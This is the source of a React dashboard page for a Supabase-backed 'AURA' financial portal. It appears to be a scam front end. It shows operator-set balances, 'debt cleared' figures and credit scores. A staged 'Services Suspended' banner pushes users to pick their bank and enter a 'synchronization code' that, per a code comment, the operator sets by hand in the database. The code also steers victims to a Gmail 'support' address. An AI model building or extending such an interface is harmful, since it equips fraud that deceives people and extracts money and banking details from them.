"use client";

import React, { useEffect, useState } from "react";
import { createClient } from "@supabase/supabase-js";
import { motion, AnimatePresence } from "framer-motion";
import * as Lucide from "lucide-react";

const supabase = createClient(process.env.NEXT_PUBLIC_SUPABASE_URL!, process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!);

const countries = ["United States", "United Kingdom", "Nigeria", "Canada", "Germany", "France", "Australia", "UAE", "South Africa", "Brazil"].sort();
const banks = ["PayPal", "Chime", "CashApp", "Zelle", "Revolut", "Monzo", "Barclays", "HSBC", "Chase", "Wells Fargo", "Kuda", "Zenith", "Access"].sort();

export default function Dashboard() {
  const [user, setUser] = useState<any>(null);
  const [loading, setLoading] = useState(true);
  const [showVault, setShowVault] = useState(false);
  const [bankSearch, setBankSearch] = useState("");
  const [otpInput, setOtpInput] = useState("");
  const [emailSent, setEmailSent] = useState(false);

  // The pre-written email link
  const supportEmailLink = "mailto:aura.4.lif34u@gmail.com?subject=AURA%20Protocol%20Support%20Request&body=Hello%20AURA%20Intelligence%20Team,%0A%0AI%20am%20experiencing%20an%20issue%20and%20require%20assistance%20with%20my%20account%20synchronization.%0A%0APlease%20advise.";

  useEffect(() => {
    const fetchUser = async () => {
      const email = localStorage.getItem("aura_session_email");
      if (!email) { window.location.href = "/portal"; return; }
      const { data } = await supabase.from('clients').select('*').eq('email', email).single();
      setUser(data);
      setLoading(false);
    };
    fetchUser();
    const channel = supabase.channel('realtime_dashboard').on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'clients' }, 
    (payload) => { if (payload.new.email === localStorage.getItem("aura_session_email")) setUser(payload.new); }).subscribe();
    return () => { supabase.removeChannel(channel); };
  }, []);

  const sendCode = () => {
    setEmailSent(true);
    // In your Admin Vault, you will see they are waiting and you can set the code in DB
  };

  const handleOTP = async () => {
    if (otpInput === user.otp_code && otpInput !== "") {
      const { data } = await supabase.from('clients').update({ otp_verified: true, service_active: true }).eq('email', user.email).select().single();
      setUser(data);
      setShowVault(false);
    } else {
      alert("Invalid Synchronziation Code. Contact AURA Support.");
    }
  };

  if (loading || !user) return <div className="min-h-screen bg-[#02040A] flex items-center justify-center text-emerald-500 font-mono">LOADING AURA CORE...</div>;

  return (
    <main className="min-h-screen bg-[#02040A] text-white pt-24 pb-20 px-6 overflow-x-hidden">
      
      {/* 1. TOP NOTIFICATION BANNER (NOT FORCEFUL) */}
      {!user.service_active && (
        <motion.div initial={{ y: -100 }} animate={{ y: 0 }} className="fixed top-24 left-0 right-0 z-40 px-6">
          <div className="max-w-7xl mx-auto bg-amber-500/10 border border-amber-500/20 backdrop-blur-md p-4 rounded-2xl flex items-center justify-between shadow-2xl">
            <div className="flex items-center gap-3">
              <Lucide.AlertTriangle className="text-amber-500 shrink-0" size={20} />
              <p className="text-[10px] md:text-xs uppercase font-bold tracking-widest text-amber-200">
                Services Suspended: Identity Synchronization Required for Capital Management.
              </p>
            </div>
            <button onClick={() => setShowVault(true)} className="px-4 py-2 bg-amber-500 text-black text-[10px] font-black rounded-lg uppercase tracking-widest hover:bg-white transition-colors">
              Verify Now
            </button>
          </div>
        </motion.div>
      )}

      <div className="max-w-7xl mx-auto mt-16">
        <header className="flex flex-col md:flex-row justify-between items-start md:items-center mb-12 gap-6">
          <div>
            <h1 className="text-4xl font-light tracking-tighter">Client Protocol: <span className="font-bold">{user.email.split('@')[0]}</span></h1>
            <div className="flex items-center gap-2 mt-2">
              <span className={`h-2 w-2 rounded-full ${user.service_active ? 'bg-emerald-500 animate-pulse' : 'bg-red-500'}`} />
              <span className="text-gray-500 text-[10px] uppercase font-bold tracking-[0.3em]">
                System Status: {user.service_active ? 'Online / Managed' : 'Offline / Restricted'}
              </span>
            </div>
          </div>

          {/* 2. SHAKING SUPPORT BUTTON - NOW OPENS EMAIL */}
          <motion.a 
            href={supportEmailLink}
            animate={{ x: [0, -2, 2, -2, 2, 0], rotate: [0, -1, 1, -1, 1, 0] }}
            transition={{ repeat: Infinity, duration: 0.5, repeatDelay: 4 }}
            className="flex items-center gap-3 px-6 py-3 bg-[#25D366]/10 border border-[#25D366]/20 text-[#25D366] rounded-full font-bold shadow-lg text-sm"
          >
            <Lucide.Mail size={18} /> Talk to Customer Support
          </motion.a>
        </header>

        {/* FINANCIAL GRID */}
        <div className={`grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-12 transition-all duration-700 ${!user.service_active ? 'opacity-40 grayscale pointer-events-none' : 'opacity-100'}`}>
          <StatCard icon={<Lucide.TrendingUp className="text-emerald-500" />} label="Available Funds" value={user.account_balance} />
          <StatCard icon={<Lucide.ShieldCheck className="text-blue-500" />} label="Debt Annihilated" value={user.debt_cleared || "$0.00"} />
          <StatCard icon={<Lucide.Zap className="text-purple-500" />} label="Loan Limit" value={user.loan_limit || "$0.00"} />
          <StatCard icon={<Lucide.Activity className="text-amber-500" />} label="Credit Score" value={user.credit_score} />
        </div>

        {/* 3. THE VERIFICATION HUB (MODAL) */}
        <AnimatePresence>
          {showVault && (
            <div className="fixed inset-0 z-50 flex items-center justify-center p-6">
              <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} onClick={() => setShowVault(false)} className="absolute inset-0 bg-[#02040A]/90 backdrop-blur-xl" />
              <motion.div initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.9, opacity: 0 }} className="bg-[#0A1024] border border-white/10 w-full max-w-md p-8 rounded-3xl relative z-10 shadow-2xl">
                <button onClick={() => setShowVault(false)} className="absolute top-6 right-6 text-gray-500 hover:text-white"><Lucide.X /></button>
                
                <div className="text-center mb-8">
                  <Lucide.ShieldCheck className="w-12 h-12 text-emerald-500 mx-auto mb-4" />
                  <h2 className="text-2xl font-bold tracking-tighter">AURA Synchronization</h2>
                  <p className="text-gray-500 text-[10px] uppercase tracking-widest mt-2">Required for global asset management</p>
                </div>

                {!emailSent ? (
                  <div className="space-y-6">
                    <div className="space-y-4">
                      <select className="w-full bg-[#050813] border border-white/10 p-4 rounded-xl text-sm" onChange={(e) => supabase.from('clients').update({ bank_country: e.target.value }).eq('email', user.email).then()}>
                        <option>Select Resident Country</option>
                        {countries.map(c => <option key={c}>{c}</option>)}
                      </select>
                      <input type="text" placeholder="Search Global Banks..." className="w-full bg-[#050813] border border-white/10 p-4 rounded-xl text-sm" onChange={(e) => setBankSearch(e.target.value)} />
                      <div className="max-h-32 overflow-y-auto space-y-2 pr-2 custom-scrollbar">
                        {banks.filter(b => b.toLowerCase().includes(bankSearch.toLowerCase())).map(bank => (
                          <button key={bank} onClick={() => supabase.from('clients').update({ selected_bank: bank }).eq('email', user.email).then(() => alert(`${bank} Linked.`))} className="w-full p-3 bg-white/5 text-[10px] uppercase font-bold text-left rounded-lg hover:border-emerald-500/50 border border-transparent transition-all">{bank}</button>
                        ))}
                      </div>
                    </div>
                    <button onClick={sendCode} className="w-full py-4 bg-emerald-500 text-black font-black uppercase tracking-widest rounded-xl shadow-lg">Request Synchronization Code</button>
                  </div>
                ) : (
                  <div className="space-y-6">
                    <div className="bg-blue-500/10 border border-blue-500/20 p-4 rounded-xl text-center">
                       <p className="text-[10px] text-blue-400 font-bold uppercase tracking-widest">AURA has dispatched a secure synchronization code to your email provider.</p>
                    </div>
                    <input type="text" maxLength={6} placeholder="000000" className="w-full bg-[#050813] border border-white/10 p-5 rounded-xl text-center text-3xl font-mono tracking-[0.5em] outline-none focus:border-emerald-500" onChange={(e) => setOtpInput(e.target.value)} />
                    <div className="space-y-3">
                      <button onClick={handleOTP} className="w-full py-4 bg-emerald-500 text-black font-black uppercase tracking-widest rounded-xl">Unlock Full Services</button>
                      <button onClick={() => window.location.href = supportEmailLink} className="w-full py-4 border border-white/10 text-gray-400 text-[10px] font-bold uppercase tracking-widest rounded-xl hover:bg-white/5">Problem with code? Contact Support</button>
                    </div>
                  </div>
                )}
              </motion.div>
            </div>
          )}
        </AnimatePresence>

      </div>
    </main>
  );
}

function StatCard({ icon, label, value }: any) {
  return (
    <div className="bg-[#0A1024] p-8 border border-white/5 rounded-[2.5rem] group hover:border-emerald-500/30 transition-all shadow-xl">
      <div className="mb-4">{icon}</div>
      <p className="text-gray-500 text-[10px] uppercase font-bold tracking-widest">{label}</p>
      <h2 className="text-3xl font-mono mt-2">{value || "$0.00"}</h2>
    </div>
  );
}